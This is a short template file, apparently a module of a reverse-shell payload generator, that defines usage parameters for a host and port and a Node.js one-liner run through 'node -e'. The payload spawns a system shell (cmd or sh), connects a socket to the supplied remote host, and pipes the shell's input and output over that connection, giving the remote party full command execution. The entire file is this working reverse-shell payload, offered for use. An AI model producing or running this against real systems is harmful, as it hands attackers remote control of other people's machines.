
USAGE = 'host port'
NARGS = [2, 2]
LANG = 'js'
EXEC = '''
node -e "PAYLOAD"
'''


pl = '''
(()=>{VAR0=require('child_process').spawn(process.platform.includes('win')?'cmd':'sh');(VAR1=new require('net').Socket()).connect(ARG2,'ARG1',()=>{VAR1.pipe(VAR0.stdin);VAR0.stdout.pipe(VAR1);VAR0.stderr.pipe(VAR1)});return /VAR0/})()
'''
